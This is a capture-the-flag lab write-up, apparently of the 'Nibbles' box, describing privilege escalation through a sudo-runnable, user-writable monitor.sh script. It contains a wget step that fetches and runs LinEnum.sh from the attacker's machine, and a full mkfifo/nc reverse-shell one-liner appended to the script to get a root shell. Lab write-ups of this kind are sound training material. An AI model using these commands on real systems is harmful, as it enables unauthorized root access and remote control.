Unzip the personal. Zip and see a file called monitor. Sh under the directory called /home/nibbler.
The shell script file monitor. Sh is a monitoring script, and it is owned by our nibbler user and writeable.

```
cat monitor.sh
####################################################################################################

                 #                                        Tecmint_monitor.sh                                        #

                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #

                 # If any bug, report us in the link below                                                          #

                 # Free to use/edit/distribute the code below by                                                    #

                 # giving proper credit to Tecmint.com and Author                                                   #

                 #                                                                                                  #

                 ####################################################################################################

```
Now pull in LinEnum. Sh to perform some automated privilege escalation checks. First, download script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command, 
```
sudo python -m http.server 8080 (from the attacking device)
```
Back on the target type wget http://<yourip>: 8080/LinEnum. Sh to download the script. If successful, we will see a 200 success response on our python HTP server. Once the script is pulled over, chmod +x LinEnum. Sh to make the script executable and then run it. 

The nibbler can run the file with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with sudo we should get a reverse shell back as the root user. Let us edit the monitor. Sh file to append a reverse shell one liner. 

```
nibbler@Nibbles :/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

Finally catch the root shell on our waiting nc listener.
From here we can grab a root. Txt flag. 
